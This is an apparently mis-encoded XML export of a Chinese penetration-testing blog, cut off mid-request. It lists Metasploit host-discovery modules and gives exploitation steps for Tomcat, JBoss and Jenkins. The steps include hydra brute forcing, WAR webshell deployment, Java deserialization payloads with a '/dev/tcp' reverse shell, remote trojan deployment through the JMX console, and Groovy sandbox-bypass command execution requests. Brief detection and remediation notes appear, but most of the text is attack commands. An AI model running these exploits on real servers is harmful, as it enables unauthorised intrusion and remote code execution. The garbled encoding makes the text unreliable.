å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº auxiliary/scanner/discovery/udp_sweep # å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº auxiliary/scanner/ftp/ftp_version # å‘ç°FTPæœåŠ¡ auxiliary/scanner/http/http_version # å‘ç°HTTPæœåŠ¡ auxiliary/scanner/smb/smb_version # å‘ç°SMBæœåŠ¡ äºŒä¸»è¦ä»‹ç»scannerä¸‹çš„äº”ä¸ªæ¨¡å—,è¾…åŠ©å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº,åˆ†åˆ«ä¸º: auxiliary/scanner/ssh/ssh_version # å‘ç°SSHæœåŠ¡ auxiliary/scanner/telnet/telnet_version # å‘ç°TELNETæœåŠ¡ auxiliary/scanner/discovery/udp_probe # å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº auxiliary/scanner/dns/dns_amp # å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº auxiliary/scanner/mysql/mysql_version # å‘ç°mysqlæœåŠ¡ ä¸‰ä¸»è¦ä»‹ç»scannerä¸‹çš„äº”ä¸ªæ¨¡å—,è¾…åŠ©å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº,åˆ†åˆ«ä¸º: auxiliary/scanner/netbios/nbname # å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº auxiliary/scanner/http/title # å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº auxiliary/scanner/db2/db2_version # å‘ç°db2æœåŠ¡ auxiliary/scanner/portscan/ack # å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº auxiliary/scanner/portscan/tcp # å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº å››ä¸»è¦ä»‹ç»scannerä¸‹çš„äº”ä¸ªæ¨¡å—,è¾…åŠ©å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº,åˆ†åˆ«ä¸º: auxiliary/scanner/portscan/syn # å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº auxiliary/scanner/portscan/ftpbounce # å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº auxiliary/scanner/portscan/xmas # å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº auxiliary/scanner/rdp/rdp_scanner # å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº auxiliary/scanner/smtp/smtp_version # å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº äº”ä¸»è¦ä»‹ç»scannerä¸‹çš„ä¸‰ä¸ªæ¨¡å—,ä»¥åŠdb_nmapè¾…åŠ©å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº,åˆ†åˆ«ä¸º: auxiliary/scanner/pop3/pop3_version # å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº auxiliary/scanner/postgres/postgres_version # å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº auxiliary/scanner/ftp/anonymous # å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº db_nmap # å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº(MSFå†…ç½®å¼ºå¤§çš„ç«¯å£æ‰«æå·¥å…·Nmap,ä¸ºäº†æ›´å¥½çš„åŒºåˆ«,å†…ç½®å‘½ä»¤ä¸º:db_nmap, ä½¿ç”¨æ–¹æ³•ä¸nmapä¸€è‡´) #å¦‚ï¼š db_nmap â€p 445 â€T4 â€sT 192.168.1.115â€120 â€â€open hosts # æŸ¥çœ‹æ•°æ®åº“ä¸­å·²å‘ç°çš„å†…ç½‘å­˜æ´»ä¸»æœº hosts â€h # hostså‘½ä»¤ä¹Ÿæ”¯æŒæ•°æ®åº“ä¸­æŸ¥è¯¢ä¸æœç´¢,æ–¹ä¾¿å¿«é€Ÿå¯¹åº”ç›®æ ‡å­˜æ´»ä¸»æœº hosts â€S 192 # æœç´¢å…³é”®å­— hosts â€h æŸ¥çœ‹å‚æ•°ï¼š â€a,â€â€add Add the hosts instead of searching â€d,â€â€delete Delete the hosts instead of searching â€c &lt;col1,col2> Only show the given columns (see list below) â€C &lt;col1,col2> Only show the given columns until the next restart (se e list below) â€h,â€â€help Show this help information â€u,â€â€up Only show hosts which are up â€o &lt;file> Send output to a file in csv format â€O &lt;column> Order rows by specified column number â€R,â€â€rhosts Set RHOSTS from the results of the search â€S,â€â€search Search string to filter by â€i,â€â€info Change the info of a host â€n,â€â€name Change the name of a host â€m,â€â€comment Change the comment of a host â€t,â€â€tag Add or specify a tag to a range of hosts å…­ä¸»è¦ä»‹ç»postä¸‹çš„å…­ä¸ªæ¨¡å—,è¾…åŠ©å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº,åˆ†åˆ«ä¸º: windows/gather/arp_scanner windows/gather/enum_ad_computers windows/gather/enum_computers windows/gather/enum_domain windows/gather/enum_domains windows/gather/enum_ad_user_comments 1.åŸºäºwindows/gather/arp_scannerå‘ç°å†…ç½‘å­˜æ´»ä¸»æœº meterpreter > run windows/gather/arp_scanner RHOSTS=192.168.1.110â€120 THREADS=20 2.åŸºäºwindows/gather/enum_ad_computerså‘ç°åŸŸä¸­å­˜æ´»ä¸»æœº meterpreter > run windows/gather/enum_ad_computers 3.åŸºäºwindows/gather/enum_computerså‘ç°åŸŸä¸­å­˜æ´»ä¸»æœº meterpreter > run windows/gather/enum_computers 4.åŸºäºwindows/gather/enum_domainå‘ç°åŸŸä¸­å­˜æ´»ä¸»æœº meterpreter > run windows/gather/enum_domain 5.åŸºäºwindows/gather/enum_domains å‘ç°åŸŸä¸­å­˜æ´»ä¸»æœº meterpreter > run windows/gather/enum_domains 6.åŸºäºwindows/gather/enum_ad_user_commentså‘ç°åŸŸä¸­å­˜æ´»ä¸»æœº meterpreter > run windows/gather/enum_ad_user_comments POSTä¸‹ç›¸å…³æ¨¡å—å¦‚ä¸‹ï¼š linux/gather/enum_network linux/busybox/enum_hosts windows/gather/enum_ad_users windows/gather/enum_domain_tokens windows/gather/enum_snmp document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>å†…ç½‘</tag>
        <tag>æ¢æµ‹ä¸»æœºå­˜æ´»</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Tomcatå¸¸è§æ¼æ´å¤ç°]]></title>
    <url>%2Fposts%2F40402%2F</url>
    <content type="text"><![CDATA[åå°ç®¡ç†é¡µé¢å¼±å£ä»¤é»˜è®¤ï¼šhttp://127.0.0.1:8080/manager/htmlé¡µé¢åªå…è®¸æœ¬åœ°è®¿é—®ï¼Œé™¤éç®¡ç†å‘˜æ‰‹å·¥ä¿®æ”¹äº†è¿™äº›å±æ€§ 1.å°è¯•ç™»å½•åå°1.å°è¯•é»˜è®¤è´¦æˆ·å¯†ç ï¼štomcat:tomcat2.å¦‚æœä¸æ˜¯ï¼Œå°è¯•ç”¨å¼±å£ä»¤å­—å…¸è¿›è¡Œçˆ†ç ´ # hydraçˆ†ç ´manageråå° hydra -L user.txt -P user.txt -f 10.10.10.81 -s 8080 http-get /manager/html 2.éƒ¨ç½²waråŒ… # waråŒ…ç”Ÿæˆ jar -cvf xx.war xx.jsp 3.éƒ¨ç½²å, è®¿é—®é©¬è®¿é—® http://127.0.0.1:8080/war åŒ…å(æ— åç¼€) / åŒ…åå†…æ–‡ä»¶å 4.åç»­æ“ä½œ å®‰å…¨æ£€æŸ¥æŸ¥çœ‹tomcatæ—¥å¿— tail /root/tomcats/apache-tomcat-xxx/logs/xxxx_log # å¦‚æœå‡ºç°å¤§é‡401ï¼Œå°±å¯èƒ½æ­£åœ¨è¢«çˆ†ç ´ æŸ¥çœ‹éƒ¨ç½²çš„waråŒ… # éƒ¨ç½²è·¯å¾„åœ¨tomcatçš„webappsç›®å½•ä¸‹ï¼Œè¿›è¡Œæ£€æŸ¥ # æŸ¥çœ‹éƒ¨ç½²waråŒ…çš„æ—¥å¿—(tomcatçš„logsä¸‹)ï¼Œæ˜¯å¦æœ‰éƒ¨ç½²çš„ç—•è¿¹ ä¿®å¤å»ºè®® è‹¥æ— å¿…è¦,å–æ¶ˆ manager/html åŠŸèƒ½ã€‚ è‹¥è¦ä½¿ç”¨, manager é¡µé¢åº”åªå…è®¸æœ¬åœ° IP è®¿é—® ä»»æ„æ–‡ä»¶å†™å…¥(CVE-2017-12615)æ¼æ´æœ¬è´¨æ˜¯ Tomcat é…ç½®æ–‡ä»¶ /conf/web.xml é…ç½®äº†å¯å†™( readonly=false ),å¯¼è‡´æˆ‘ä»¬å¯ä»¥å¾€æœåŠ¡å™¨å†™æ–‡ä»¶: æ¡ä»¶ï¼š æœåŠ¡å™¨å¼€å¯äº†putæ–¹æ³•ï¼› åŒæ—¶tomcatå­˜åœ¨åç¼€è§£ææ¼æ´ å¤ç°æ­£å¸¸çŠ¶å†µï¼šåˆ©ç”¨æˆåŠŸï¼š å®‰å…¨æ£€æŸ¥æŸ¥çœ‹æ—¥å¿—å†…å®¹ï¼Œå¦‚æœæ–¹æ³•æ˜¯PUTï¼Œ ä¸”çŠ¶æ€ç ä¸º201ï¼Œå°±è¦æ³¨æ„äº† é˜²å¾¡æªæ–½ ç¦ç”¨PUTæ–¹æ³•(é»˜è®¤æ˜¯ç¦æ­¢çš„ï¼Œå¼€å¯REST APIçš„æƒ…å†µä¸‹å¯èƒ½ä¼šå¼€å¯ â€“&gt; å’Œä¸šåŠ¡ä¿æŒæ²Ÿé€š) è®¾ç½®å¼ºå¯†ç æˆ–åˆ é™¤Webæ§åˆ¶å°ï¼Œä»¥åŠç¤ºä¾‹é¡µé¢(å¯èƒ½æš´éœ²ä¿¡æ¯)ï¼Œå…³é—­æŠ¥é”™é¡µé¢æç¤º å°† readonly=true ,é»˜è®¤ä¸º true è¿œç¨‹ä»£ç æ‰§è¡Œ(CVE-2019-0232)å½±å“èŒƒå›´: 9.0.0.M1 ~ 9.0.17, 8.5.0 ~ 8.5.39 , 7.0.0 ~ 7.0.93å½±å“ç³»ç»Ÿ: Windows ç¯å¢ƒæ­å»ºæ‰‹å¤´æš‚æ—¶æ²¡windowsç³»ç»Ÿï¼Œä»ç½‘ä¸Šå€Ÿé‰´äº†ä¸€ä¸‹ é…ç½®Apache TomcatæœåŠ¡å™¨ï¼ˆä¿®æ”¹confç›®å½•é…ç½®æ–‡ä»¶ï¼Œå¯ç”¨CGIï¼‰1ã€æ‰“å¼€Tomcatå®‰è£…ç›®å½•çš„apache-tomcat-8.5.39\conf\web.xmlä¿®æ”¹å¦‚ä¸‹é…ç½®ï¼Œåœ¨é»˜è®¤æƒ…å†µä¸‹é…ç½®æ˜¯æ³¨é‡Šçš„ã€‚ 2ã€æ‰“å¼€Tomcatå®‰è£…ç›®å½•çš„apache-tomcat-8.5.39\conf\context.xmlä¿®æ”¹å¦‚ä¸‹é…ç½®ï¼Œæ·»åŠ privileged=â€trueâ€ ã€‚ 3ã€åœ¨apache-tomcat-8.5.39\webapps\ROOT\WEB-INFç›®å½•æ–°å»ºä¸€ä¸ªcgi-binæ–‡ä»¶å¤¹ï¼Œåˆ›å»ºä¸€ä¸ªtest.batçš„æ–‡ä»¶ï¼Œå†…å®¹éšæ„ æ¼æ´åˆ©ç”¨POC # è®¿é—® http://127.0.0.1:8080/cgi-bin/test.bat?&amp;dir # æ‰§è¡Œå‘½ä»¤ http://127.0.0.1:8080/cgi-bin/test.bat?&amp;C:/WINDOWS/system32/net+user Note:net å‘½ä»¤çš„è·¯å¾„è¦å†™å…¨,ç›´æ¥å†™ net user , Tomcat æ§åˆ¶å°ä¼šæç¤ºnet ä¸æ˜¯å†…éƒ¨å‘½ä»¤,ä¹Ÿä¸æ˜¯å¯è¿è¡Œçš„ç¨‹åº,å¦ å¿…é¡»ä½¿ç”¨ + å·è¿æ¥,ä½¿ç”¨ ç©ºæ ¼ ,%2B éƒ½ä¼šæ‰§è¡Œå¤±è´¥,æ§åˆ¶å°æŠ¥é”™ã€‚ æ–‡ä»¶åŒ…å«æ¼æ´(CVE-2020-1938)è¯¥æ¼æ´æ˜¯ç”±äºTomcat AJPåè®®å­˜åœ¨ç¼ºé™·è€Œå¯¼è‡´ï¼Œæ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´å¯é€šè¿‡æ„é€ ç‰¹å®šå‚æ•°ï¼Œè¯»å–æœåŠ¡å™¨webappä¸‹çš„ä»»æ„æ–‡ä»¶ã€‚è‹¥ç›®æ ‡æœåŠ¡å™¨åŒæ—¶å­˜åœ¨æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œæ”»å‡»è€…å¯è¿›ä¸€æ­¥å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ç›®å‰ï¼Œå‚å•†å·²å‘å¸ƒæ–°ç‰ˆæœ¬å®Œæˆæ¼æ´ä¿®å¤ã€‚ å—å½±å“ç‰ˆæœ¬ Apache Tomcat 6 Apache Tomcat 7 &lt; 7.0.100 Apache Tomcat 8 &lt; 8.5.51 Apache Tomcat 9 &lt; 9.0.31 ä¸å—å½±å“ç‰ˆæœ¬ Apache Tomcat = 7.0.100 Apache Tomcat = 8.5.51 Apache Tomcat = 9.0.31 æ–‡ä»¶åŒ…å«RCEå¤ç°POCï¼šhttps://github.com/0nise/CVE-2020-1938https://github.com/nibiwodong/CNVD-2020-10487-Tomcat-Ajp-lfi-POC åˆ©ç”¨æ–‡ç« ï¼šhttps://www.cnblogs.com/Rain99-/p/12517660.htmlhttps://blog.csdn.net/SouthWind0/article/details/105147369/ é˜²æŠ¤æªæ–½ æ›´æ–°åˆ°å®‰å…¨ç‰ˆæœ¬ å…³é—­AJPæœåŠ¡ï¼Œä¿®æ”¹Tomcaté…ç½®æ–‡ä»¶Service.xml,æ³¨é‡Šæ‰ï¼š&lt;Connector port="8009" protocol="AJP/1.3" redirectPort="8443" /&gt; é…ç½®ajpé…ç½®ä¸­çš„secretRequiredè·Ÿsecretå±æ€§æ¥é™åˆ¶è®¤è¯ å‚è€ƒhttps://www.cnvd.org.cn/webinfo/show/5415 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>tomcat</tag>
        <tag>ä¸­é—´ä»¶æ¼æ´</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jbosså¸¸è§æ¼æ´å¤ç°]]></title>
    <url>%2Fposts%2F60637%2F</url>
    <content type="text"><![CDATA[JBoss 5.x/6.x ååºåˆ—åŒ–æ¼æ´( CVE-2017-12149 )éªŒè¯ï¼š è®¿é—®/invoker/readonlyï¼Œå¦‚æœè¿”å› 500 ,è¯´æ˜é¡µé¢å­˜åœ¨,æ­¤é¡µé¢å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ã€‚ åˆ©ç”¨å·¥å…·ï¼šJavaDeserH2HCæ­¥éª¤ï¼š1.å…ˆç¼–è¯‘ # æˆ‘ä»¬é€‰æ‹©ä¸€ä¸ª Gadget : ReverseShellCommonsCollectionsHashMap ,ç¼–è¯‘å¹¶ç”Ÿæˆåºåˆ—åŒ–æ•°æ® javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java 2.è®¾ç½®åå¼¹çš„IPå’Œç«¯å£ï¼š java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.0.105:8888 # ip æ˜¯ nc æ‰€åœ¨çš„ ip # è¿™æ ·å°±ä¼šå°†åºåˆ—åŒ–å¯¹è±¡ä¿å­˜åœ¨ReverseShellCommonsCollectionsHashMap.serä¸­ï¼Œç”¨curlå‘½ä»¤å‘é€åˆ°JbossæœåŠ¡åœ°å€ 3.æœ¬æœºè¿›è¡Œç›‘å¬ nv -lvvp 8888 4.å†æ‰“å¼€å¦ä¸€ä¸ªæ§åˆ¶å°ï¼Œè¿è¡Œå¦‚ä¸‹curlå‘½ä»¤ curl http://192.168.0.100:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser 5.æˆåŠŸåå¼¹shell JBoss JMXInvokerServlet ååºåˆ—åŒ–æ¼æ´éªŒè¯ï¼š è®¿é—® /invoker/JMXInvokerServletï¼Œè¿”å›å¦‚ä¸‹,è¯´æ˜æ¥å£å¼€æ”¾,æ­¤æ¥å£å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ã€‚ è¿™é‡Œç›´æ¥åˆ©ç”¨ CVE-2017-12149 ç”Ÿæˆçš„ ser ,å‘é€åˆ° /invoker/JMXInvokerServletæ¥å£ä¸­ã€‚ ä¹Ÿå¯ä»¥ç›´æ¥åˆ©ç”¨å·¥å…·æ£€æµ‹ï¼šå·¥å…·ä¸‹è½½åœ°å€ # è¿è¡Œå·¥å…·å³å¯ java -jar DeserializeExploit.jar JBoss EJBInvokerServlet ååºåˆ—åŒ–æ¼æ´éªŒè¯ï¼š è®¿é—® /invoker/EJBInvokerServlet è¿”å›å¦‚ä¸‹,è¯´æ˜æ¥å£å¼€æ”¾,æ­¤æ¥å£å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ã€‚ è¿™é‡Œç›´æ¥åˆ©ç”¨ CVE-2017-12149 ç”Ÿæˆçš„ ser ,å‘é€åˆ° /invoker/EJBInvokerServlet æ¥å£ä¸­ ä¿®å¤å»ºè®® ä¸éœ€è¦ttp-invoker.sarç»„ä»¶çš„ç”¨æˆ·å¯ç›´æ¥åˆ é™¤æ­¤ç»„ä»¶ æˆ–æ·»åŠ å¦‚ä¸‹ä»£ç è‡³ http-invoker.sar ä¸‹ web.xml çš„ security-constraint æ ‡ç­¾ä¸­,å¯¹ http invoker ç»„ä»¶è¿›è¡Œè®¿é—®æ§åˆ¶:&lt;url-pattern&gt;/*&lt;/url-pattern&gt; JBoss &lt;=4.x JBossMQ JMS ååºåˆ—åŒ–æ¼æ´( CVE-2017-7504 )åˆ©ç”¨å·¥å…·ï¼šJavaDeserH2HCæ­¥éª¤ï¼š1.å…ˆç¼–è¯‘ # é€‰æ‹©ExampleCommonsCollections1WithHashMapï¼Œç¼–è¯‘å¹¶ç”Ÿæˆåºåˆ—åŒ–æ•°æ® javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java #ç¼–è¯‘ 2.è®¾ç½®åå¼¹çš„IPå’Œç«¯å£ï¼š java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap "bash -i >&amp; /dev/tcp/192.168.0.105/1234 0>&amp;1" #serå…¨ç§°serializeï¼Œåºåˆ—åŒ–æ¶æ„æ•°æ®è‡³æ–‡ä»¶ã€‚ 3.æœ¬æœºè¿›è¡Œç›‘å¬ nv -lvvp 1234 4.å†æ‰“å¼€å¦ä¸€ä¸ªæ§åˆ¶å°ï¼Œè¿è¡Œå¦‚ä¸‹curlå‘½ä»¤ #è¯¥seræ–‡ä»¶ä½œä¸ºè¯·æ±‚æ•°æ®ä¸»ä½“å‘é€å¦‚ä¸‹æ•°æ®åŒ… curl http://192.168.0.100:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ExampleCommonsCollections1WithHashMap.ser # --data-binary æ„ä¸ºä»¥äºŒè¿›åˆ¶çš„æ–¹å¼postæ•°æ® 5.æˆåŠŸåå¼¹shell JMX Console æœªæˆæƒè®¿é—®æ¼æ´æè¿°æœªæˆæƒè®¿é—®ç®¡ç†æ§åˆ¶å°,é€šè¿‡è¯¥æ¼æ´,å¯ä»¥åå°ç®¡ç†æœåŠ¡,å¯ä»¥é€šè¿‡è„šæœ¬å‘½ä»¤æ‰§è¡Œç³»ç»Ÿå‘½ä»¤,å¦‚åå¼¹shell,wgetå†™webshellæ–‡ä»¶ã€‚ ç¯å¢ƒæ­å»ºä½¿ç”¨vulhub cd vulhub/jboss/CVE-2017-7504/ docker-compose up -d # æµè§ˆå™¨è®¿é—® å¤ç°1.æœªæˆæƒè®¿é—®æµ‹è¯•ï¼ˆæ— æ— éœ€è®¤è¯è¿›å…¥å…¥æ§åˆ¶â»šé¡µé¢é¢ï¼‰ http://192.168.0.100:8080/ # è¿›å…¥æ§åˆ¶é¡µ JMX Console http://192.168.0.100:8080/jmx-console/ 2.ç‚¹å‡»jboss.deploymentè¿›å…¥åº”ç”¨éƒ¨ç½²é¡µé¢ 3.ä½¿ç”¨apacheæ­å»ºè¿œç¨‹æœ¨é©¬æœåŠ¡å™¨(è¿™é‡Œåœ¨kaliä¸Šæ­å»º) # waré©¬çš„åˆ¶ä½œæ–¹å¼ï¼šhttps://www.peekeyes.com/2020/01/13/%E5%88%B6%E4%BD%9Cwar%E6%9C%A8%E9%A9%AC%E5%B9%B6%E4%B8%94%E6%8B%BF%E4%B8%8Bwebshell/ jar cvf shell.war shell.jsp 4.é€šè¿‡addurlå‚æ•°è¿›è¡Œæœ¨é©¬çš„è¿œç¨‹éƒ¨ç½² åœ°å€å†™è¿œç¨‹æœåŠ¡å™¨waré©¬çš„åœ°å€ æˆåŠŸéƒ¨ç½² 5.è¿æ¥æœ¨é©¬ http://192.168.0.100:8080/shell/shell.jsp é˜²æŠ¤ å¯¹jmxæ§åˆ¶é¡µé¢è®¿é—®æ·»åŠ è®¿é—®éªŒè¯ã€‚ è¿›è¡ŒJMX Console å®‰å…¨é…ç½®ã€‚ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>æœªæˆæƒè®¿é—®</tag>
        <tag>ä¸­é—´ä»¶æ¼æ´</tag>
        <tag>JBoss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Jenkinsä¸€äº›å®‰å…¨é—®é¢˜]]></title>
    <url>%2Fposts%2F63696%2F</url>
    <content type="text"><![CDATA[æ¼æ´ç®€ä»‹åŠå±å®³é»˜è®¤æƒ…å†µä¸‹ Jenkinsé¢é¢æ¿ä¸­ç”¨æˆ·å¯ä»¥é€‰æ‹©æ‰§è¡Œè„šæœ¬ç•Œé¢æ¥æ“ä½œä¸€äº›ç³»ç»Ÿå±‚å‘½ä»¤,æ”»å‡»è€…å¯é€šè¿‡æœªæˆæƒè®¿é—®æ¼æ´æˆ–è€…æš´åŠ›ç ´è§£ç”¨æˆ·å¯†ç ç­‰è¿›å…¥åå°ç®¡ç†æœåŠ¡,é€šè¿‡è„šæœ¬æ‰§è¡Œè¡Œç•Œé¢ä»è€Œè·å–æœåŠ¡å™¨æƒé™ã€‚ ç¯å¢ƒæ­å»º# ä¸‹è½½åœ°å€ï¼š https://www.jenkins.io/download/ # å¯ä»¥ç›´æ¥ä¸‹è½½waråŒ… java -jar jenkins.war # è¿è¡Œ # wget http://mirrors.jenkins.io/debian/jenkins_1.621_all.deb # ä¸‹è½½ dpkg -i jenkins_1.621_all.deb # å®‰è£… sudo apt-get -f --fix-missing install # å¦‚æœæœ‰æŠ¥ä¾èµ–é¡¹çš„é”™è¯¯æ—¶æ‰§è¡Œè¡Œè¡Œ service jenkinis start # å¼€å¯JenkinsæœåŠ¡ æµè§ˆå™¨å™¨è®¿é—®http://192.168.0.100:8080/ æœªæˆæƒè®¿é—®æµ‹è¯•è®¿é—®http://192.168.0.100:8080/manageå¯ä»¥çœ‹åˆ°æ²¡æœ‰ä»»ä½•é™åˆ¶å¯ä»¥ç›´æ¥è®¿é—® Jenkinsæœªæˆæƒè®¿é—®å†™shell1.ç‚¹å‡»â€œè„šæœ¬å‘½ä»¤è¡Œâ€ 2.æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ println "whoami".execute().text 3.åˆ©ç”¨â€œè„šæœ¬å‘½ä»¤è¡Œâ€å†™webshell,(éœ€è¦ä¸€å®šçš„æƒé™ä¸”çŸ¥é“ç½‘ç«™ç»å¯¹è·¯å¾„)ï¼Œç‚¹å‡»è¿è¡Œ,å†™å…¥æˆåŠŸ new File ("/var/www/html/shell.php").write('&lt;?php phpinfo(); ?>'); 4.è®¿é—®shell.phpï¼Œ æµ‹è¯•æˆåŠŸ CVE-2017-1000353 è¿™æ˜¯ä¸€ä¸ªjavaååºåˆ—åŒ–æ¼æ´ æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å¯åŠ¨jenkins 2.46.1ï¼š docker-compose up -d ç­‰å¾…å®Œå…¨å¯åŠ¨æˆåŠŸåï¼Œè®¿é—®http://your-ip:8080å³å¯çœ‹åˆ°jenkinså·²æˆåŠŸè¿è¡Œï¼Œæ— éœ€æ‰‹å·¥å®‰è£…ã€‚ åŸç†å‚è€ƒï¼š https://blogs.securiteam.com/index.php/archives/3171 æµ‹è¯•1.ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸² # å‚è€ƒ https://github.com/vulhub/CVE-2017-1000353 # é¦–å…ˆä¸‹è½½POCç”Ÿæˆå·¥å…·ï¼š https://github.com/vulhub/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar # æ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼Œç”Ÿæˆå­—èŠ‚ç æ–‡ä»¶ java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser "touc /tmp/success" # jenkins_poc.seræ˜¯ç”Ÿæˆçš„å­—èŠ‚ç æ–‡ä»¶å # "touch ..."æ˜¯å¾…æ‰§è¡Œçš„ä»»æ„å‘½ä»¤ # ç”Ÿæˆjenkins_poc.seræ–‡ä»¶ï¼Œè¿™å°±æ˜¯åºåˆ—åŒ–å­—ç¬¦ä¸²ã€‚ 2.ç”Ÿæˆjenkins_poc.seræ–‡ä»¶ï¼Œè¿™å°±æ˜¯åºåˆ—åŒ–å­—ç¬¦ä¸²ã€‚ # ä¸‹è½½ https://github.com/vulhub/CVE-2017-1000353/blob/master/exploit.py # Python3æ‰§è¡Œ python3 exploit.py http://192.168.0.100:8080 jenkins_poc.ser # å°†åˆšæ‰ç”Ÿæˆçš„å­—èŠ‚ç æ–‡ä»¶å‘é€ç»™ç›®æ ‡ 3.è¿›å…¥dockerå®¹å™¨å‘ç°æ–‡ä»¶åˆ›å»ºæˆåŠŸ CVE-2018-1000861Jenkinsä½¿ç”¨Stapleræ¡†æ¶å¼€å‘ï¼Œå…¶å…è®¸ç”¨æˆ·é€šè¿‡URL PATHæ¥è°ƒç”¨ä¸€æ¬¡publicæ–¹æ³•ã€‚ç”±äºè¿™ä¸ªè¿‡ç¨‹æ²¡æœ‰åšé™åˆ¶ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ ä¸€äº›ç‰¹æ®Šçš„PATHæ¥æ‰§è¡Œä¸€äº›æ•æ„Ÿçš„Javaæ–¹æ³•ã€‚é€šè¿‡è¿™ä¸ªæ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°å¾ˆå¤šå¯ä¾›åˆ©ç”¨çš„åˆ©ç”¨é“¾ã€‚å…¶ä¸­æœ€ä¸¥é‡çš„å°±æ˜¯ç»•è¿‡Groovyæ²™ç›’å¯¼è‡´æœªæˆæƒç”¨æˆ·å¯æ‰§è¡Œä»»æ„å‘½ä»¤ï¼šJenkinsåœ¨æ²™ç›’ä¸­æ‰§è¡ŒGroovyå‰ä¼šå…ˆæ£€æŸ¥è„šæœ¬æ˜¯å¦æœ‰é”™è¯¯ï¼Œæ£€æŸ¥æ“ä½œæ˜¯æ²¡æœ‰æ²™ç›’çš„ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡Meta-Programmingçš„æ–¹å¼ï¼Œåœ¨æ£€æŸ¥è¿™ä¸ªæ­¥éª¤æ—¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ æµ‹è¯•æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å¯åŠ¨ä¸€ä¸ªJenkins 2.138ï¼ŒåŒ…å«æ¼æ´çš„æ’ä»¶ä¹Ÿå·²ç»å®‰è£…ï¼š docker-compose up -d ä½¿ç”¨ @orangetw ç»™å‡ºçš„ä¸€é”®åŒ–POCè„šæœ¬ï¼Œå‘é€å¦‚ä¸‹è¯·æ±‚å³å¯æˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼š http://192.168.0.100:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript ?sandbox=true &amp;value=public class x { public x(){ "touch /tmp/success".execute() } } # è¯·æ±‚æ›¿æ¢åˆ°burpæ‹¦æˆªçš„æ•°æ®åŒ…ä¸­ æ•°æ®åŒ…å¦‚ä¸‹ GET /securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public%20class%20x%20{public%20x(){%22touch%20/tmp/CVE-2018-1000861_is_success%22.execute()}} HTTP/1.1 Host: 192.168.0.100:8080 User-Agent: 